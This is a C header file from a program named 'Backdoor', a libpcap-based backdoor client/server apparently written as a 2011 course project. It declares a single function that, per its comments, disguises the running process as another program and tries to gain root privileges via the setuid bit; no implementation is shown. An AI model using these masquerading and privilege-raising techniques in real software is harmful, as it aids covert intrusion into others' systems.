#ifndef MASK_H
#define MASK_H

/*
SOURCE FILE: mask.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Aman Abdulla

PROGRAMMERS:
	Aman Abdulla
	Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to mask the program process
	identifier and raise priveleges (provided the setuid bit is set).
*/

/*
FUNCTION: maskprog

PARAMS:
	char *progname: The program to pretend we are.

RETURN: none.

NOTES:
	This function will also attempt to raise the privelege level to
	root.
*/
void maskprog(char *progname);

#endif
